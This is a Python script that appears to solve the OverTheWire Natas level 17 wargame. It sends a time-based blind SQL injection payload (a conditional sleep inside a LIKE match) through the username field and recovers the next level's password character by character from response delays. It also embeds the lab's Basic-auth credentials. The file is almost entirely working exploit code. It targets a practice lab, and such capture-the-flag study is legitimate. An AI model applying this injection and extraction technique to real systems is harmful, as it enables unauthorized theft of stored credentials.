import requests
import string
import base64
import itertools
import time

def build_password():
    letters = string.printable
    tmp = "C"

    while(len(tmp) < 32):
        for letter in letters:
            if is_subpassword(letter + tmp):
                print("added " + letter + " to " + tmp)
                tmp = letter + tmp
                break
            elif is_subpassword(tmp + letter):
                print("added " + tmp + " to " + letter)
                tmp = tmp + letter
                break
    return tmp

def is_subpassword(suggestion):
    auth_key = "Basic " + base64.b64encode(b"natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw").decode("utf-8")
    start = time.perf_counter()
    result = requests.post("http://natas17.natas.labs.overthewire.org", 
                            headers={"Authorization": auth_key}, 
                            data={"username": "natas18\" and if(password like \"%" + suggestion + "%\" COLLATE latin1_general_cs, sleep(3), 1)#"})
    return time.perf_counter() - start > 3

print(build_password())
